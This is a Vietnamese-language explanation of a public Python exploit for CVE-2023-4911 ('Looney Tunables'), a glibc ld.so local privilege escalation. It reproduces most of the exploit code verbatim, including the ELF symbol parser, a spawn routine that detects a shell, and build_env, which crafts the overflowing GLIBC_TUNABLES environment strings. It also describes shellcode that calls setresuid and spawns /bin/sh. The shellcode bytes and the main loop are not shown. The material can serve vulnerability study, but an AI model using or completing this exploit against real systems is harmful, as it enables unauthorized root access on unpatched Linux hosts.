# Giải thích mã khai thác CVE-2023-4911 (gnu-acme.py)

## Tổng quan
Đây là một mã khai thác cho lỗ hổng CVE-2023-4911 (còn được gọi là "Looney Tunables") trong glibc. Lỗ hổng này cho phép leo thang đặc quyền cục bộ thông qua việc khai thác cách xử lý biến môi trường GLIBC_TUNABLES trong ld.so.

## Cấu trúc mã

### Các thành phần chính

1. **Cấu hình kiến trúc (ARCH)**
   - Định nghĩa shellcode cho các kiến trúc khác nhau (i686, x86_64, aarch64)
   - Mỗi shellcode thực hiện:
     - setresuid(euid, euid, euid)
     - execve("/bin/sh", ["sh", NULL], NULL)
     - exit(0x66)

2. **Các hàm chính**

   - `find_hax_path()`: Tìm đường dẫn khai thác trong blob dữ liệu
   - `lolstruct()`: Hàm tiện ích để unpack dữ liệu struct
   - `lib_path()`: Lấy đường dẫn của thư viện
   - `spawn()`: Thực thi một chương trình với các tham số và môi trường cụ thể
   - `lazy_elf` class: Phân tích file ELF
   - `build_env()`: Xây dựng môi trường khai thác

3. **Cơ chế khai thác**
   - Sử dụng biến môi trường GLIBC_TUNABLES để ghi đè bộ nhớ
   - Tạo các chuỗi môi trường đặc biệt để khai thác lỗ hổng
   - Thực thi shellcode để leo thang đặc quyền

### Cách hoạt động

1. Mã kiểm tra xem ASLR có được bật không
2. Xây dựng môi trường khai thác với các biến GLIBC_TUNABLES được điều chỉnh
3. Tạo các chuỗi môi trường đặc biệt để ghi đè bộ nhớ
4. Thực thi shellcode để leo thang đặc quyền

## Yêu cầu và hạn chế

- Yêu cầu quyền truy cập vào hệ thống
- Hoạt động trên các phiên bản glibc bị ảnh hưởng
- Đã được thử nghiệm trên:
  - glibc 2.35-0ubuntu3 (aarch64)
  - glibc 2.36-9+deb12u2 (amd64)

## Lưu ý

- Mã này là một proof-of-concept và không nên được sử dụng cho mục đích độc hại
- Không có hỗ trợ chính thức cho mã này
- Cần tắt ASLR để tìm offset phù hợp cho ld.so

## Tham khảo

- [Advisory của Qualys](https://www.qualys.com/2023/10/03/cve-2023-4911/looney-tunables-local-privilege-escalation-glibc-ld-so.txt)
- Tác giả: blasty <peter@haxx.in>

## Các thư viện được sử dụng

1. **binascii**
   - Sử dụng để chuyển đổi giữa dữ liệu nhị phân và ASCII
   - Hàm `unhexlify()` được sử dụng để chuyển đổi chuỗi hex thành dữ liệu nhị phân

2. **resource**
   - Sử dụng để quản lý tài nguyên hệ thống
   - Hàm `setrlimit()` được sử dụng để đặt giới hạn tài nguyên cho stack

3. **struct**
   - Sử dụng để đóng gói và giải đóng gói dữ liệu nhị phân
   - Được sử dụng trong hàm `lolstruct()` để phân tích cấu trúc ELF

4. **select**
   - Sử dụng để xử lý I/O đa luồng
   - Hỗ trợ trong việc quản lý các tiến trình con

5. **ctypes**
   - Cung cấp khả năng tương tác với thư viện C
   - Sử dụng để tải và gọi các hàm từ libc.so.6
   - Định nghĩa các cấu trúc C như `LINKMAP`

6. **shutil**
   - Cung cấp các tiện ích cho thao tác với file
   - Hàm `which()` được sử dụng để tìm đường dẫn của các chương trình

7. **os**
   - Cung cấp các hàm tương tác với hệ điều hành
   - Sử dụng cho các thao tác như fork, waitpid, và quản lý tiến trình

8. **sys**
   - Cung cấp các biến và hàm tương tác với trình thông dịch Python
   - Sử dụng để xử lý các tham số dòng lệnh và thoát chương trình

Các thư viện này được sử dụng để:
- Tương tác với hệ thống ở mức thấp
- Xử lý dữ liệu nhị phân
- Quản lý tiến trình
- Tương tác với thư viện C
- Xử lý file và đường dẫn

## Giải thích chi tiết các hàm

### 1. Hàm unhex
```python
unhex = lambda v: binascii.unhexlify(v.replace(" ", ""))
```
- Đây là một hàm lambda (hàm ẩn danh) được định nghĩa để chuyển đổi chuỗi hex thành dữ liệu nhị phân
- `v.replace(" ", "")`: Loại bỏ tất cả khoảng trắng trong chuỗi hex
- `binascii.unhexlify()`: Chuyển đổi chuỗi hex thành dữ liệu nhị phân
- Được sử dụng để chuyển đổi shellcode từ dạng hex sang dạng nhị phân

### 2. Hàm find_hax_path
```python
def find_hax_path(blob, offset):
    pos = offset
    while pos > 0:
        if blob[pos] != 0 and blob[pos] != 0x2F and blob[pos + 1] == 0:
            return {"path": bytes([blob[pos]]), "offset": pos - offset}
        pos = pos - 1
    return None
```
- Tìm đường dẫn khai thác trong một khối dữ liệu nhị phân
- `blob`: Khối dữ liệu nhị phân cần tìm kiếm
- `offset`: Vị trí bắt đầu tìm kiếm
- Tìm kiếm ngược từ vị trí offset cho đến khi tìm thấy một byte không phải 0 hoặc '/'
- Trả về dictionary chứa đường dẫn và offset tương đối

### 3. Hàm lolstruct
```python
def lolstruct(format, keys, data):
    return dict(zip(keys.split(" "), struct.unpack(format, data)))
```
- Hàm tiện ích để unpack dữ liệu struct thành dictionary
- `format`: Định dạng struct (ví dụ: "<L" cho unsigned long little-endian)
- `keys`: Chuỗi các tên trường, phân cách bằng khoảng trắng
- `data`: Dữ liệu nhị phân cần unpack
- Sử dụng `struct.unpack()` để giải mã dữ liệu và `zip()` để kết hợp với tên trường

### 4. Hàm lib_path
```python
def lib_path(libname):
    class LINKMAP(Structure):
        _fields_ = [("l_addr", c_void_p), ("l_name", c_char_p)]

    lib = CDLL(find_library("c"))
    libdl = CDLL(find_library("dl"))
    dlinfo = libdl.dlinfo
    dlinfo.argtypes = c_void_p, c_int, c_void_p
    dlinfo.restype = c_int
    lmptr = c_void_p()
    dlinfo(lib._handle, 2, byref(lmptr))
    return cast(lmptr, POINTER(LINKMAP)).contents.l_name
```
- Lấy đường dẫn đầy đủ của một thư viện
- Sử dụng ctypes để tương tác với thư viện C
- Định nghĩa cấu trúc LINKMAP để lưu thông tin về thư viện
- Sử dụng dlinfo() để lấy thông tin về thư viện đã tải
- Trả về đường dẫn đầy đủ của thư viện

### 5. Hàm spawn
```python
def spawn(filename, argv, envp):
    cargv = (c_char_p * len(argv))(*argv)
    cenvp = (c_char_p * len(envp))(*envp)
    child_pid = os.fork()

    if not child_pid:
        execve(filename, cargv, cenvp)
        exit(0)

    start_time = time.time()
    while True:
        try:
            pid, status = os.waitpid(child_pid, os.WNOHANG)
            if pid == child_pid:
                if os.WIFEXITED(status):
                    return os.WEXITSTATUS(status) & 0xFF7F
                else:
                    return 0
        except:
            pass
        current_time = time.time()
        if current_time - start_time >= 1.5:
            print("** ohh... looks like we got a shell? **\n")
            os.waitpid(child_pid, 0)
            return 0x1337
```
- Thực thi một chương trình với các tham số và môi trường cụ thể
- Tạo các mảng C cho argv và envp
- Fork một tiến trình con
- Trong tiến trình con: thực thi chương trình với execve
- Trong tiến trình cha: theo dõi trạng thái của tiến trình con
- Nếu tiến trình con chạy quá 1.5 giây, giả định rằng đã có shell và trả về 0x1337

### 6. Lớp lazy_elf
```python
class lazy_elf:
    def __init__(self, filename):
        self.d = open(filename, "rb").read()
        self.bits = 64 if self.d[4] == 2 else 32
        eh_size = 0x30 if self.bits == 64 else 0x24
        self.h = lolstruct(
            "<HHLQQQLHHHHHH" if self.bits == 64 else "<HHLLLLLHHHHHH",
            "type machine version entry phoff shoff flags ehsize "
            + "phtentsize phnum shentsize shnum shstrndx",
            self.d[0x10 : 0x10 + eh_size],
        )
        shstr = self.shdr(self.h["shstrndx"])
        self.section_names = self.d[shstr["offset"] : shstr["offset"] + shstr["size"]]

    def shdr(self, idx):
        pos = self.h["shoff"] + (idx * self.h["shentsize"])
        return lolstruct(
            "<LLQQQQLLQQ" if self.bits == 64 else "<LLLLLLLLLL",
            "name type flags addr offset size link info addralign entsize",
            self.d[pos : pos + self.h["shentsize"]],
        )

    def shdr_by_name(self, name):
        name = name.encode()
        for i in range(self.h["shnum"]):
            shdr = self.shdr(i)
            if self.section_names[shdr["name"] :].split(b"\x00")[0] == name:
                return shdr
        return None

    def section_by_name(self, name):
        s = self.shdr_by_name(name)
        return self.d[s["offset"] : s["offset"] + s["size"]]

    def symbol(self, name):
        name = name.encode()
        dynsym = self.section_by_name(".dynsym")
        dynstr = self.section_by_name(".dynstr")
        sym_size = 24 if self.bits == 64 else 16
        for i in range(len(dynsym) // sym_size):
            pos = i * sym_size
            if self.bits == 64:
                sym = lolstruct(
                    "<LBBHQQ",
                    "name info other shndx value size",
                    dynsym[pos : pos + sym_size],
                )
            else:
                sym = lolstruct(
                    "<LLLBBH",
                    "name value size info other shndx",
                    dynsym[pos : pos + sym_size],
                )
            if dynstr[sym["name"] :].split(b"\x00")[0] == name:
                return sym["value"]
        return None
```
- Lớp để phân tích file ELF
- `__init__`: Đọc file ELF và phân tích header
- `shdr`: Lấy thông tin section header
- `shdr_by_name`: Tìm section header theo tên
- `section_by_name`: Lấy nội dung của section theo tên
- `symbol`: Tìm địa chỉ của một symbol trong file ELF

### 7. Hàm build_env
```python
def build_env(adjust, addr, offset, bits=64):
    if bits == 64:
        env = [
            b"GLIBC_TUNABLES=glibc.mem.tagging=glibc.mem.tagging=" + b"P" * adjust,
            b"GLIBC_TUNABLES=glibc.mem.tagging=glibc.mem.tagging=" + b"X" * 8,
            b"GLIBC_TUNABLES=glibc.mem.tagging=glibc.mem.tagging=" + b"X" * 7,
            b"GLIBC_TUNABLES=glibc.mem.tagging=" + b"Y" * 24,
        ]
        pad = 172
        fill = 47
    else:
        env = [
            b"GLIBC_TUNABLES=glibc.mem.tagging=glibc.mem.tagging=" + b"P" * adjust,
            b"GLIBC_TUNABLES=glibc.mem.tagging=glibc.mem.tagging=" + b"X" * 7,
            b"GLIBC_TUNABLES=glibc.mem.tagging=" + b"X" * 14,
        ]
        pad = 87
        fill = 47 * 2

    for j in range(pad):
        env.append(b"")

    if bits == 64:
        env.append(struct.pack("<Q", addr))
        env.append(b"")
    else:
        env.append(struct.pack("<L", addr))

    for i in range(384):
        env.append(b"")

    return env
```
- Xây dựng môi trường khai thác
- `adjust`: Số lượng byte cần điều chỉnh
- `addr`: Địa chỉ cần ghi đè
- `offset`: Offset trong bộ nhớ
- `bits`: Kiến trúc (32 hoặc 64 bit)
- Tạo các biến môi trường GLIBC_TUNABLES với các giá trị đặc biệt
- Thêm các chuỗi rỗng để điều chỉnh vị trí trong bộ nhớ
- Đóng gói địa chỉ theo định dạng little-endian
- Trả về danh sách các biến môi trường
